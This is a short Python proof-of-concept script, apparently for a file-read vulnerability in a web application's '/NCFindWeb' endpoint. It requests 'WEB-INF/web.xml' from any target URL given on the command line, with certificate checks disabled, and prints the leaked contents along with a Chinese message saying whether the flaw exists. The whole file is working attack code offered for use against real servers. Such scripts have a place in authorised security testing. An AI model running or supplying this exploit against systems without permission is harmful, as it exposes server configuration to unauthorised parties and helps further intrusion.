#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
    burp0_headers = {}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "WebApplicationStartupHook" in r.text:
        return r.text[:800]
    return ""
    

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 web.xml 结果为：", info)
    else:
        print("[-]漏洞不存在")
